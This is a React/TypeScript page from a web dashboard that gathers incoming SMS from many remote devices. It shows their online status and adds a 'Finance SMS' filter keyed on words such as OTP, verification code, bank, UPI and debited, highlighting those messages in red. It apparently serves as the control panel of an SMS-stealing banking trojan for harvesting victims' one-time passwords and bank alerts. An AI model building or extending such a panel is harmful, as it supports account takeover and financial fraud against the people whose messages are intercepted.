// src/pages/SmsHistoryPage.tsx
import { useEffect, useMemo, useState, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import type { SmsDoc } from "../types";
import {
  listNotificationDevices,
  listDeviceNotifications,
  deleteDeviceNotifications,
  deleteAllNotifications,
} from "../services/api/sms";
import { getDevices } from "../services/api/devices";

// ✅ reuse your tech bg asset (same vibe as DevicesPage)
import pageBg from "../assets/login-bg.png";

/**
 * SmsHistoryPage.tsx — TECH GLASS MOBILE (FINAL)
 * - Shows device "reverse count" number and Online/Offline pill from devices list
 * - Adds Finance SMS toggle to show only finance-related messages (keywords list)
 *
 * FIX (2026-03-05): DevicesPage now reverses devices so "new device" appears on top.
 * This page now mirrors that exact ordering before computing displayNumber,
 * so numbering matches DevicesPage.
 *
 * FIX: Long SMS body now shows FULL text (no line clamp / truncation).
 */

type SmsWithDevice = SmsDoc & { _deviceId?: string };

function getTimestamp(m: any): number {
  const t = m?.timestamp ?? m?.time ?? m?.createdAt ?? m?.date;
  if (typeof t === "number") return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!Number.isNaN(n)) return n;
    const d = Date.parse(t);
    if (!Number.isNaN(d)) return d;
  }
  return 0;
}

function getId(m: any): string {
  return String(m?._id ?? m?.id ?? `${getTimestamp(m)}-${m?.sender ?? ""}-${m?.receiver ?? ""}-${m?.title ?? ""}`);
}

function extractDeviceId(m: any): string | null {
  const d = m?._deviceId ?? m?.deviceId ?? m?.device ?? m?.device_id ?? m?.deviceID ?? null;
  if (!d) return null;
  const s = String(d).trim();
  return s.length ? s : null;
}

function safeStr(v: any): string {
  return String(v ?? "").trim();
}

/* small helpers from DevicesPage */
function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}
function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

/* --- finance keywords --- */
const FINANCE_KEYWORDS = [
  "credit",
  "debit",
  "bank",
  "balance",
  "transaction",
  "txn",
  "upi",
  "amount",
  "a/c",
  "code",
  "inr",
  "₹",
  "paid",
  "withdrawn",
  "deposited",
  "statement",
  "card",
  "bill",
  "valid",
  "otp",
  "one time password",
  "verification code",
  "debited",
  "credited",
  "withdrawn",
  "debit",
  "credit",
  "received",
  "payment",
].map((s) => s.toLowerCase());

function isFinanceSms(m: any) {
  if (!m) return false;
  const title = safeStr(m.title || "").toLowerCase();
  const body = safeStr(m.body || "").toLowerCase();
  for (const kw of FINANCE_KEYWORDS) {
    if (title.includes(kw) || body.includes(kw)) return true;
  }
  return false;
}

function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
      <div className="pointer-events-none absolute inset-0">
        <div className="absolute -inset-6 rounded-[34px] blur-3xl bg-cyan-400/14" />
      </div>

      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/14" />
      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/10" />

      {/* corner accents */}
      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 border-l-2 border-t-2 border-cyan-200/50 rounded-tl-[10px]" />
      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 border-r-2 border-t-2 border-cyan-200/50 rounded-tr-[10px]" />
      <div className="pointer-events-none absolute left-3 bottom-3 h-6 w-6 border-l-2 border-b-2 border-cyan-200/50 rounded-bl-[10px]" />
      <div className="pointer-events-none absolute right-3 bottom-3 h-6 w-6 border-r-2 border-b-2 border-cyan-200/50 rounded-br-[10px]" />

      <div
        className={[
          "relative rounded-[26px] px-4 py-4",
          "bg-white/[0.055]",
          "border border-white/[0.16]",
          "backdrop-blur-3xl backdrop-saturate-[1.6]",
          "shadow-[0_30px_90px_rgba(0,0,0,0.58)]",
        ].join(" ")}
      >
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-70"
          style={{
            backgroundImage:
              "linear-gradient(to bottom, rgba(255,255,255,0.20), rgba(255,255,255,0.06) 22%, rgba(255,255,255,0.02) 45%, rgba(255,255,255,0.00) 70%)",
          }}
        />
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-20"
          style={{
            backgroundImage:
              "repeating-linear-gradient(to bottom, rgba(255,255,255,0.05) 0px, rgba(255,255,255,0.05) 1px, transparent 1px, transparent 7px)",
          }}
        />
        <div className="relative">{children}</div>
      </div>
    </div>
  );
}

export default function SmsHistoryPage() {
  const navigate = useNavigate();

  const [deviceIds, setDeviceIds] = useState<string[]>([]);
  const [allMessages, setAllMessages] = useState<SmsWithDevice[]>([]);

  const [loadingDevices, setLoadingDevices] = useState(false);
  const [loadingMessages, setLoadingMessages] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // deviceId -> { displayNumber, online, brand }
  const [deviceMetaMap, setDeviceMetaMap] = useState<
    Record<string, { displayNumber: number; online: boolean; brand?: string }>
  >({});

  const [financeOnly, setFinanceOnly] = useState(false);

  const [sinceFilter, setSinceFilter] = useState<number | "">("");
  const [refreshTick, setRefreshTick] = useState(0);

  const since = useMemo(() => (sinceFilter === "" ? undefined : Number(sinceFilter)), [sinceFilter]);

  async function loadDevices() {
    setLoadingDevices(true);
    setError(null);
    try {
      const ids = await listNotificationDevices();
      const clean = (ids || [])
        .map((i: any) => String(i || "").trim())
        .filter(Boolean);
      setDeviceIds(clean);
      return clean;
    } catch (e) {
      console.error("loadDevices failed", e);
      setError("Failed to load notification devices");
      setDeviceIds([]);
      return [];
    } finally {
      setLoadingDevices(false);
    }
  }

  async function loadDevicesMeta() {
    try {
      const list = await getDevices();
      const arr = Array.isArray(list) ? list : [];

      const normalized = arr.map((d: any) => {
        const id = pickDeviceId(d) || "unknown";
        return { raw: d, deviceId: id, online: !!d?.status?.online };
      });

      // Match DevicesPage (newest on top)
      normalized.reverse();

      const total = normalized.length;
      const meta: Record<string, { displayNumber: number; online: boolean; brand?: string }> = {};

      for (let i = 0; i < normalized.length; i++) {
        const displayNumber = total - i;
        const item = normalized[i];
        meta[item.deviceId] = { displayNumber, online: item.online, brand: pickBrand(item.raw) };
      }

      setDeviceMetaMap(meta);
    } catch (e) {
      console.error("loadDevicesMeta failed", e);
      setDeviceMetaMap({});
    }
  }

  async function loadAllMessages(devices?: string[]) {
    setLoadingMessages(true);
    setError(null);

    try {
      const ids = devices ?? deviceIds;
      if (!ids || ids.length === 0) {
        setAllMessages([]);
        return;
      }

      const results = await Promise.all(
        ids.map(async (id) => {
          try {
            const list = await listDeviceNotifications(id, since);
            const arr = (list || []) as SmsDoc[];
            return arr.map((m: any) => ({ ...(m || {}), _deviceId: id })) as SmsWithDevice[];
          } catch (err) {
            console.warn("loadAllMessages device failed", id, err);
            return [] as SmsWithDevice[];
          }
        })
      );

      const merged = results.flat().sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a));
      setAllMessages(merged);
    } catch (e) {
      console.error("loadAllMessages failed", e);
      setError("Failed to load messages");
      setAllMessages([]);
    } finally {
      setLoadingMessages(false);
    }
  }

  async function handleDeleteDevice(deviceId: string) {
    if (!confirm(`Delete all notifications for device ${deviceId}?`)) return;
    try {
      await deleteDeviceNotifications(deviceId);
      const ids = await loadDevices();
      await loadAllMessages(ids);
      await loadDevicesMeta();
      alert("Deleted");
    } catch (e) {
      console.error("delete device failed", e);
      alert("Failed to delete notifications");
    }
  }

  async function handleDeleteAll() {
    if (!confirm("Delete ALL notifications? This cannot be undone.")) return;
    try {
      await deleteAllNotifications();
      await loadDevices();
      setAllMessages([]);
      await loadDevicesMeta();
      alert("All notifications deleted");
    } catch (e) {
      console.error("delete all failed", e);
      alert("Failed to delete all notifications");
    }
  }

  function openDeviceFromMessage(m: SmsWithDevice) {
    const deviceId = extractDeviceId(m);
    if (!deviceId) return;
    navigate(`/devices/${encodeURIComponent(deviceId)}`);
  }

  useEffect(() => {
    (async () => {
      const ids = await loadDevices();
      await loadAllMessages(ids);
      await loadDevicesMeta();
    })();

    const id = setInterval(() => setRefreshTick((t) => t + 1), 20_000);
    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (refreshTick <= 0) return;
    (async () => {
      const ids = await loadDevices();
      await loadAllMessages(ids);
      await loadDevicesMeta();
    })().catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [refreshTick]);

  useEffect(() => {
    loadAllMessages().catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [sinceFilter]);

  const financeCount = useMemo(() => allMessages.filter((m) => isFinanceSms(m)).length, [allMessages]);

  const visibleMessages = useMemo(() => {
    return financeOnly ? allMessages.filter((m) => isFinanceSms(m)) : allMessages;
  }, [allMessages, financeOnly]);

  const uniqueDevicesInMessages = useMemo(() => {
    const set = new Set<string>();
    for (const m of allMessages) {
      const d = extractDeviceId(m);
      if (d) set.add(d);
    }
    return set.size;
  }, [allMessages]);

  return (
    <div className="relative w-full min-h-[100svh] overflow-x-hidden bg-black">
      {/* TECH BG */}
      <div className="absolute inset-0 bg-center bg-cover" style={{ backgroundImage: `url(${pageBg})` }} />
      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />

      {/* soft orbs */}
      <div className="pointer-events-none absolute inset-0 opacity-35">
        <div className="absolute -top-24 left-1/2 h-[460px] w-[460px] -translate-x-1/2 rounded-full blur-3xl bg-cyan-400/16" />
        <div className="absolute top-[35%] left-[-120px] h-[360px] w-[360px] rounded-full blur-3xl bg-blue-400/10" />
        <div className="absolute bottom-[-140px] right-[-140px] h-[420px] w-[420px] rounded-full blur-3xl bg-cyan-300/12" />
      </div>

      {/* CONTENT */}
      <div className="relative w-full max-w-[420px] mx-auto px-3 pb-24 pt-4">
        <TechGlassCard>
          {/* header */}
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0">
              <div className="text-[22px] font-extrabold tracking-tight text-white">Notifications / SMS</div>
              <div className="text-[12px] text-white/60">Incoming SMS stored from devices (tap SMS to open its device)</div>
              <div className="text-[11px] text-white/45 mt-1">
                Devices: {loadingDevices ? "…" : deviceIds.length} • In list: {uniqueDevicesInMessages}
              </div>
            </div>

            <div className="flex items-center gap-2 shrink-0">
              <button
                onClick={async () => {
                  const ids = await loadDevices();
                  await loadAllMessages(ids);
                  await loadDevicesMeta();
                }}
                className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 backdrop-blur-2xl hover:bg-white/[0.09]"
                type="button"
              >
                Refresh
              </button>

              <button
                onClick={handleDeleteAll}
                className="h-10 px-4 rounded-2xl border border-red-400/25 bg-red-500/10 text-red-100 backdrop-blur-2xl hover:bg-red-500/14"
                type="button"
              >
                Delete All
              </button>
            </div>
          </div>

          {/* Finance toggle */}
          <div className="mt-3 flex items-center justify-end gap-2">
            <button
              onClick={() => setFinanceOnly((s) => !s)}
              className={[
                "h-9 px-3 rounded-2xl text-[13px] font-semibold",
                "border border-white/[0.14]",
                financeOnly
                  ? "bg-yellow-400/90 border-yellow-300 text-black shadow-[0_6px_18px_rgba(250,204,21,0.18)]"
                  : "bg-white/[0.06] text-white/85 hover:bg-white/[0.09]",
              ].join(" ")}
              type="button"
              title="Show only finance-related SMS"
              aria-pressed={financeOnly}
            >
              Finance SMS ({financeCount})
            </button>
          </div>

          {/* filter */}
          <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
            <div className="text-[12px] text-white/55 mb-2">Filter by since (ms since epoch)</div>
            <div className="flex items-center gap-2">
              <input
                placeholder="since (ms) or empty"
                value={sinceFilter === "" ? "" : String(sinceFilter)}
                onChange={(e) => {
                  const v = e.target.value.trim();
                  if (v === "") setSinceFilter("");
                  else setSinceFilter(Number(v) || "");
                }}
                className={[
                  "flex-1 h-11 rounded-2xl px-4 text-[14px]",
                  "text-white placeholder:text-white/35",
                  "bg-white/[0.06]",
                  "border border-white/[0.14]",
                  "backdrop-blur-2xl",
                  "outline-none",
                  "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
                ].join(" ")}
              />
              <button
                onClick={() => setSinceFilter("")}
                className="h-11 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 hover:bg-white/[0.09]"
                type="button"
              >
                Clear
              </button>
            </div>
          </div>

          {/* list */}
          <div className="mt-4 space-y-3">
            {loadingDevices || loadingMessages ? (
              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-5 text-center text-white/70">
                Loading…
              </div>
            ) : deviceIds.length === 0 ? (
              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-6 text-center text-white/60">
                No devices with notifications.
              </div>
            ) : visibleMessages.length === 0 ? (
              <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-6 text-center text-white/60">
                No messages.
              </div>
            ) : (
              visibleMessages.map((m: any) => {
                const deviceId = extractDeviceId(m);
                const canOpen = Boolean(deviceId);

                const title = safeStr(m.title || "New SMS");
                const sender = safeStr(m.sender || m.senderNumber || "unknown");
                const receiver = safeStr(m.receiver || "");
                const body = safeStr(m.body || "");
                const ts = getTimestamp(m);

                const meta = deviceId ? deviceMetaMap[deviceId] : undefined;
                const finance = isFinanceSms(m);

                return (
                  <button
                    key={getId(m)}
                    onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
                    className={[
                      "w-full text-left relative",
                      "rounded-[26px] p-4",
                      "border border-white/14",
                      "bg-white/[0.055]",
                      "backdrop-blur-3xl backdrop-saturate-[1.6]",
                      "shadow-[0_22px_70px_rgba(0,0,0,0.45)]",
                      canOpen ? "hover:bg-white/[0.075] active:scale-[0.995]" : "opacity-85 cursor-default",
                      "transition",
                      "overflow-hidden",
                    ].join(" ")}
                    title={canOpen ? "Open this device" : "Device id missing"}
                    type="button"
                  >
                    <div className="pointer-events-none absolute -inset-2 rounded-[28px] blur-2xl bg-cyan-400/10" />

                    <div className="relative flex items-start justify-between gap-3">
                      <div className="min-w-0">
                        <div className="flex items-center gap-2 min-w-0">
                          <div
                            className={[
                              "text-[14px] font-extrabold truncate min-w-0",
                              finance ? "text-red-300" : "text-white",
                            ].join(" ")}
                          >
                            {title}
                          </div>

                          {meta ? (
                            <div
                              className="flex items-center justify-center w-7 h-7 rounded-full text-sm font-extrabold
                                         border border-white/14 bg-cyan-400/85 text-white shadow-[0_6px_18px_rgba(2,6,23,0.6)]
                                         flex-shrink-0"
                              title={`#${meta.displayNumber}`}
                              aria-hidden={false}
                            >
                              {meta.displayNumber}
                            </div>
                          ) : null}
                        </div>

                        <div className="text-[12px] truncate mt-1" style={{ color: finance ? "rgb(252 165 165)" : undefined }}>
                          From: {sender} {receiver ? `→ ${receiver}` : ""}
                        </div>
                        {deviceId ? (
                          <div className="mt-1 text-[11px] text-white/45 truncate">Device: {deviceId}</div>
                        ) : null}
                      </div>

                      <div className="shrink-0 flex flex-col items-end gap-2">
                        {meta ? (
                          <span
                            className={[
                              "px-3 py-1 rounded-full text-[12px] font-extrabold border",
                              meta.online
                                ? "bg-green-500/15 text-green-200 border-green-400/25"
                                : "bg-red-500/15 text-red-200 border-red-400/25",
                            ].join(" ")}
                          >
                            {meta.online ? "Online" : "Offline"}
                          </span>
                        ) : (
                          <div style={{ height: 34 }} />
                        )}

                        <div className="text-[11px] text-white/45">{ts ? new Date(ts).toLocaleString() : "-"}</div>
                      </div>
                    </div>

                    {body ? (
                      <div
                        className={[
                          "relative mt-3 text-[13px]",
                          "whitespace-pre-wrap break-words",
                          finance ? "text-red-200" : "text-white/85",
                        ].join(" ")}
                      >
                        {body}
                      </div>
                    ) : (
                      <div className="relative mt-3 text-[13px] text-white/45">—</div>
                    )}
                  </button>
                );
              })
            )}
          </div>

          {error && (
            <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
              {error}
            </div>
          )}

          {deviceIds.length > 0 && (
            <div className="mt-5 rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
              <div className="text-[12px] text-white/55 mb-3">Quick actions</div>
              <div className="flex flex-wrap gap-2">
                {deviceIds.slice(0, 10).map((d) => (
                  <button
                    key={d}
                    onClick={() => handleDeleteDevice(d)}
                    className="text-[12px] px-3 py-2 rounded-2xl border border-red-400/25 bg-red-500/10 text-red-100 hover:bg-red-500/14"
                    type="button"
                    title={`Delete notifications for ${d}`}
                  >
                    Delete {d.slice(0, 10)}…
                  </button>
                ))}
                {deviceIds.length > 10 && (
                  <div className="text-[12px] text-white/40 self-center">+{deviceIds.length - 10} more</div>
                )}
              </div>
            </div>
          )}
        </TechGlassCard>
      </div>
    </div>
  );
}